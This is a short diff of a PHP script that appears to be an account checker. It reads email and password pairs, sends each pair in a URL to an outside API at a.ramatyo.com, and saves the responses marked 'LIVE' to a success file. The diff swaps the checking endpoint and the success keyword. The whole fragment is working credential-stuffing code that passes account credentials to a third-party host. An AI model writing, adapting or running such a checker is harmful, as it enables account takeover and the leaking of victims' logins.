@@ -60,12 +60,12 @@ while(true)
         $email = trim($pecah[0]);
         $password = trim($pecah[1]);
 
-        $url = 'shorturl.at/iouRS'.$email.'|'.$password.'';
+        $url = 'https://a.ramatyo.com/api/indi.php?empas='.$email.'|'.$password.'';
 
         $curl = $modules->request($url, null);
         print $curl.PHP_EOL;
 
-        if(strpos($curl, "BISA CUK")){
+        if(strpos($curl, "LIVE")){
             $h=fopen("sukses.txt","a");
             fwrite($h,$curl);
             fwrite($h,"\n");
